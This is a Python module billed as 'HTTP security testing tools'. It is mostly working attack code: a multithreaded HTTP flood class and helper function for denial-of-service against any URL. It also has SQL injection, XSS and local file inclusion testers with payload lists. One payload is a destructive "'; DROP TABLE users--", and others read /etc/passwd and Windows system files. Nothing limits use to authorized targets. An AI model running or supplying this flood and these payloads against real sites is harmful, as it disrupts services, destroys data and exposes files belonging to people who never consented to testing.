"""HTTP security testing tools"""

import requests
import threading
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from bs4 import BeautifulSoup
from .utils import ColorPrinter


class HTTPFlood:
    """HTTP flood attack tool"""
    
    def __init__(self):
        self.running = False
        self.requests_sent = 0
        
    def flood(self, target_url, threads=100, duration=30):
        """Perform HTTP flood attack
        
        Args:
            target_url: Target URL to flood
            threads: Number of concurrent threads
            duration: Duration in seconds
        """
        self.running = True
        self.requests_sent = 0
        
        ColorPrinter.info(f"Starting HTTP flood on {target_url}")
        ColorPrinter.info(f"Threads: {threads}, Duration: {duration}s")
        
        start_time = time.time()
        
        def send_request():
            while self.running and (time.time() - start_time) < duration:
                try:
                    response = requests.get(target_url, timeout=5)
                    self.requests_sent += 1
                except:
                    pass  # Continue even if request fails
        
        # Start threads
        threads_list = []
        for _ in range(threads):
            t = threading.Thread(target=send_request)
            t.daemon = True
            t.start()
            threads_list.append(t)
        
        # Monitor progress
        while self.running and (time.time() - start_time) < duration:
            elapsed = time.time() - start_time
            rate = self.requests_sent / elapsed if elapsed > 0 else 0
            print(f"\rRequests sent: {self.requests_sent} | Rate: {rate:.2f} req/sec", end='')
            time.sleep(1)
        
        self.running = False
        
        # Wait for threads to finish
        for t in threads_list:
            t.join(timeout=2)
        
        print(f"\n{ColorPrinter.success('HTTP flood completed')}")
        print(f"Total requests: {self.requests_sent}")
        print(f"Average rate: {self.requests_sent/duration:.2f} req/sec")


class WebCrawler:
    """Web application crawler"""
    
    def __init__(self):
        self.visited_urls = set()
        self.found_urls = set()
        self.session = requests.Session()
        
    def crawl(self, base_url, max_depth=3, max_pages=100):
        """Crawl website to discover URLs
        
        Args:
            base_url: Starting URL
            max_depth: Maximum crawling depth
            max_pages: Maximum pages to crawl
            
        Returns:
            List of discovered URLs
        """
        self.visited_urls.clear()
        self.found_urls.clear()
        
        ColorPrinter.info(f"Crawling {base_url} (Depth: {max_depth}, Max pages: {max_pages})")
        
        def extract_links(url, depth):
            if depth > max_depth or len(self.visited_urls) >= max_pages:
                return
                
            if url in self.visited_urls:
                return
                
            self.visited_urls.add(url)
            
            try:
                response = self.session.get(url, timeout=10)
                if response.status_code == 200:
                    soup = BeautifulSoup(response.content, 'html.parser')
                    
                    # Extract links
                    for link in soup.find_all('a', href=True):
                        href = link['href']
                        full_url = urllib.parse.urljoin(url, href)
                        
                        # Filter out external links and fragments
                        if (full_url.startswith(base_url) and 
                            '#' not in full_url and
                            full_url not in self.found_urls):
                            
                            self.found_urls.add(full_url)
                            print(f"Found: {full_url}")
                            
                            # Recursively crawl
                            extract_links(full_url, depth + 1)
                            
            except Exception as e:
                ColorPrinter.warning(f"Error crawling {url}: {str(e)[:50]}")
        
        extract_links(base_url, 0)
        return list(self.found_urls)


class SQLInjectionTester:
    """SQL injection testing tool"""
    
    def __init__(self):
        self.session = requests.Session()
        
    def test_url(self, url, params=None):
        """Test URL for SQL injection vulnerabilities
        
        Args:
            url: Target URL
            params: GET parameters to test
            
        Returns:
            List of vulnerable parameters
        """
        vulnerable_params = []
        sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "' AND 1=2 UNION SELECT * FROM users--"
        ]
        
        ColorPrinter.info(f"Testing {url} for SQL injection")
        
        # Test GET parameters
        if params:
            for param_name, param_value in params.items():
                for payload in sql_payloads:
                    test_params = params.copy()
                    test_params[param_name] = str(param_value) + payload
                    
                    try:
                        response = self.session.get(url, params=test_params, timeout=10)
                        
                        # Check for SQL error indicators
                        error_indicators = [
                            'mysql_fetch',
                            'ORA-01756',
                            'Microsoft OLE DB Provider',
                            'Unclosed quotation mark',
                            'quoted string not properly terminated'
                        ]
                        
                        content = response.text.lower()
                        if any(indicator in content for indicator in error_indicators):
                            vulnerable_params.append({
                                'parameter': param_name,
                                'payload': payload,
                                'response_size': len(response.content),
                                'status_code': response.status_code
                            })
                            ColorPrinter.success(f"Possible SQLi in {param_name}: {payload}")
                            
                    except Exception as e:
                        ColorPrinter.warning(f"Error testing {param_name}: {str(e)}")
        
        return vulnerable_params


class XSSTester:
    """Cross-Site Scripting detection tool"""
    
    def __init__(self):
        self.session = requests.Session()
        
    def test_url(self, url, params=None):
        """Test URL for XSS vulnerabilities
        
        Args:
            url: Target URL
            params: Parameters to test
            
        Returns:
            List of vulnerable parameters
        """
        vulnerable_params = []
        xss_payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            'javascript:alert("XSS")',
            '"><script>alert("XSS")</script>'
        ]
        
        ColorPrinter.info(f"Testing {url} for XSS")
        
        if params:
            for param_name, param_value in params.items():
                for payload in xss_payloads:
                    test_params = params.copy()
                    test_params[param_name] = payload
                    
                    try:
                        response = self.session.get(url, params=test_params, timeout=10)
                        
                        # Check if payload is reflected in response
                        if payload in response.text:
                            vulnerable_params.append({
                                'parameter': param_name,
                                'payload': payload,
                                'reflected': True
                            })
                            ColorPrinter.success(f"Possible XSS in {param_name}: {payload}")
                            
                    except Exception as e:
                        ColorPrinter.warning(f"Error testing {param_name}: {str(e)}")
        
        return vulnerable_params


class LFIRFIScanner:
    """Local/Remote File Inclusion scanner"""
    
    def __init__(self):
        self.session = requests.Session()
        
    def test_lfi(self, url, params=None):
        """Test for Local File Inclusion vulnerabilities
        
        Args:
            url: Target URL
            params: Parameters to test
            
        Returns:
            List of vulnerable parameters
        """
        vulnerable_params = []
        lfi_payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '../../../../../../../../etc/passwd',
            '/etc/passwd%00',
            'C:\\boot.ini'
        ]
        
        ColorPrinter.info(f"Testing {url} for LFI")
        
        if params:
            for param_name, param_value in params.items():
                for payload in lfi_payloads:
                    test_params = params.copy()
                    test_params[param_name] = payload
                    
                    try:
                        response = self.session.get(url, params=test_params, timeout=10)
                        
                        # Look for indicators of successful LFI
                        lfi_indicators = [
                            'root:x:',
                            'bin/bash',
                            '[boot loader]',
                            '127.0.0.1'
                        ]
                        
                        content = response.text.lower()
                        if any(indicator in content for indicator in lfi_indicators):
                            vulnerable_params.append({
                                'parameter': param_name,
                                'payload': payload,
                                'indicator_found': True
                            })
                            ColorPrinter.success(f"Possible LFI in {param_name}: {payload}")
                            
                    except Exception as e:
                        ColorPrinter.warning(f"Error testing {param_name}: {str(e)}")
        
        return vulnerable_params


# Convenience functions for easy access
def http_flood_attack(url, threads=100, duration=30):
    """Convenience function for HTTP flood"""
    flooder = HTTPFlood()
    flooder.flood(url, threads, duration)

def crawl_website(url, max_depth=3, max_pages=100):
    """Convenience function for web crawling"""
    crawler = WebCrawler()
    return crawler.crawl(url, max_depth, max_pages)

def test_sql_injection(url, params=None):
    """Convenience function for SQL injection testing"""
    tester = SQLInjectionTester()
    return tester.test_url(url, params)

def test_xss(url, params=None):
    """Convenience function for XSS testing"""
    tester = XSSTester()
    return tester.test_url(url, params)

def test_lfi(url, params=None):
    """Convenience function for LFI testing"""
    scanner = LFIRFIScanner()
    return scanner.test_lfi(url, params)